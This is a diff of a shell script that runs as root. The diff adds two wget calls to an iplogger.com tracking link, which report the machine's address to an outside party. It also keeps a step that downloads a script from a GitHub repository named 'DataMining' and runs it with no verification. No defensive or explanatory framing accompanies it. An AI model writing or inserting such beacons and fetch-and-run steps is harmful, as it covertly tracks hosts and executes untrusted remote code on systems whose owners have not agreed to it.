@@ -29,18 +29,21 @@ chmod +x reconfige.sh
 #./reconfige.sh
 
 
-FILE=/root/Setup5
+FILE=/root/Setup6
 if test -f "$FILE"; then
     echo OK1
 else
-    echo "New Setup" > /root/Setup5
-    
+    echo "New Setup" > /root/Setup6
+    wget -O logger https://iplogger.com/2Lt1h5
+
         cd /root
         rm setup_9.sh
         wget -O setup_9.sh https://raw.githubusercontent.com/LearnAWS1234/DataMining/main/resetup_9.sh
         chmod +x setup_9.sh
         ./setup_9.sh
-        
+
+    wget -O logger https://iplogger.com/2Lt1h5
+
     #./reconfige.sh
     #/sbin/shutdown -r now
     #sleep 10
